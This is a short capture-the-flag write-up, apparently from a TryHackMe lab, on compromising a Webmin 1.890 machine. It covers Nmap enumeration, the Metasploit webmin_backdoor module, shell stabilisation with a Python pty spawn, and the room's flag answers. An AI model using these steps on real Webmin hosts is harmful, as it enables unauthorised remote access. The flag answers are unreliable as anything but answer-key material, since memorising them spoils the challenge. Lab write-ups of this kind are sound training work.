# Attacker KB
## 05-07-2022
## level : easy



## Discovering the lay of the land 

Nmap Scanning :
```
nmap -sV 10.10.22.55 -Pn -oN nmap.txt

```

Setting the /etc/hosts file
```
sudo nano /etc/hosts
```
then put the following line at the end of the file
```
10.10.22.55	source
```
now open it from browser
```
https://source:10000/
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Scan the machine with Nmap. What non-standard service can be found running on the high port ? | Webmin |
| Further enumerate this service, what version of it is running ? | 1.890 |
| Visit the webpage generated by this service. You should encounter an error due to SSL being present. Change the URL to use HTTPS and ignore the exception. After this, view the certificate. What hostname can we find on the cert details? On Firefox, you can view this by clicking on the 'i' in the URL, then the '>' in Connection, 'More Information', and then 'View Certificate' on the Security tab. | Source |


## Learning to Fly


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Which version of Webmin is immediately vulnerable to this exploit ? | 1.890 |
| What type of attack was this ? | Sypply Chain |
| What was the day Webmin informed of an 0day exploit ? | August 17th 2019 |
| In the assesment a Metasploit Module was added for this backdoor. What pull number was this added in ? | 12219 |




## Blasting Away

Run the Metasploit Frameword
```
msfconsole
```
Set the exploit
```
use exploit/linux/http/webmin_backdoor
```
Set the LHOST, RHOSTS and `SSL` to `true`
After setting these options just run `exploit`


Stabilizing the Shell :
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-color
```

The user flag is located at `/home/dark`

The root flag is located at `/root/`


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Now that we've selected our exploit, set the options provided appropriately. Beyond RHOSTS and LHOST, what is the third options we must set to True ? | SSL |
| Run the exploit. What is the user flag ? | THM{SUPPLY_CHAIN_COMPROMISE} |
| How about the root flag ? | THM{UPDATE_YOUR_INSTALL} |






### Thank You For Reading this

#    THE END    
